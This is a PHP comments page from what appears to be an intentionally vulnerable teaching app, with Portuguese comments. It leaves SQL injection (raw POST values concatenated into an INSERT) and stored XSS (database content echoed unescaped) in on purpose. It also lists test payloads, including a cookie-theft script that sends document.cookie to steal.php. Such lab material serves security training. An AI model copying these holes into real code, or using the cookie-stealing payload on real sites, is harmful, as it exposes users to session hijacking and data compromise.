<?php
include 'db.php';
include 'topo.php';

// ===============================================================
//  STORED XSS  (ponto de injeção obrigatório #2)
//  O comentário é salvo no banco SEM sanitizar e depois exibido
//  a todos os visitantes SEM escapar. O script fica "guardado"
//  e executa toda vez que a página é aberta.
// ===============================================================

// 1) Salvar comentário (sem sanitizar — e ainda vulnerável a SQL Injection)
if (isset($_POST['texto']) && trim($_POST['texto']) !== '') {
    $autor = $_POST['autor'] ?? 'Anônimo';
    $texto = $_POST['texto'];
    // VULNERÁVEL: entrada concatenada direto na query
    $sql = "INSERT INTO comentarios (autor, texto) VALUES ('$autor', '$texto')";
    $conn->query($sql);
}
?>

<h1>Comentários dos clientes</h1>

<form method="post" action="comentarios.php">
    <label>Seu nome:</label>
    <input type="text" name="autor" placeholder="ex: Ana">
    <label>Seu comentário:</label>
    <textarea name="texto" rows="3" placeholder="Deixe sua opinião..."></textarea>
    <button type="submit">Enviar comentário</button>
</form>

<hr>

<?php
// 2) Exibir comentários (sem escapar)
$resultado = $conn->query("SELECT autor, texto, data_criacao FROM comentarios ORDER BY id DESC");
while ($row = $resultado->fetch_assoc()) {
    echo '<div class="comentario">';
    // VULNERÁVEL: conteúdo do banco impresso direto no HTML
    echo '<span class="autor">' . $row['autor'] . '</span> ';
    echo '<small>(' . $row['data_criacao'] . ')</small>';
    echo '<p>' . $row['texto'] . '</p>';
    echo '</div>';
}
?>

<p class="aviso">💉 <b>Payloads de teste:</b><br>
• Alerta simples: <code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code><br>
• Roubo de cookie (bônus): <code>&lt;script&gt;new Image().src='steal.php?c='+document.cookie&lt;/script&gt;</code><br>
• Sem a tag script: <code>&lt;img src=x onerror=alert('XSS')&gt;</code></p>

<?php include 'rodape.php'; ?>
